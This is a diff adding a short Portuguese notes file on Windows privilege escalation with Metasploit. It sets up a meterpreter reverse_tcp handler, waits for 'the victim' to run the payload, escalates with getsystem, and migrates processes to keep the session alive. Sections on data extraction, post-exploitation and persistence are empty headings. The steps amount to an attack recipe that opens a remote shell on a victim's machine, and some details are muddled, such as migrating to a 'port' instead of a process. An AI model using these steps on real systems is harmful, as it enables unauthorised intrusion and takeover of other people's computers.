@@ -1,0 +1,41 @@
+------------------------------------------------------------------
+ESCALONAMENTO DE PRIVILÉGIOS NO WINDOWS
+------------------------------------------------------------------
+
+1) Reconhecimento
+2) injeção de SQL
+3) backdoor
+
+4) Abra o Metasploit
+5) Use multi/handler
+6) set payload windows/meterpreter/reverse_tcp
+7) set lhost +IP seu
+7.1) set lport Porta selecionada no payload
+8) run
+9) Aguarde a vitima executar o programa.
+10) sysinfo: vai ver o sistema que esta logado
+11) getsystem: coloca como adm no sistema
+12) command: ps (esse comando vai listar serviços em execução, basta vc trocar o seu pid por um que fica executando sempre
+isso evita que quando ele feche a execução vc caia da conexão.
+13) selecione uma porta e execute o comando:
+14) command: migrate + porta
+15) command: getpid (verifica seu pip se mudou)
+
+------------------------------------------------------------------
+EXTRAÇÃO DE DADOS COM METASPLOIT
+------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------
+MÓDULOS PÓS EXPLORAÇÃO
+------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------
+PERSISTENCIA DE SESSÃO NO METASPLOIT
+------------------------------------------------------------------
+
+
+
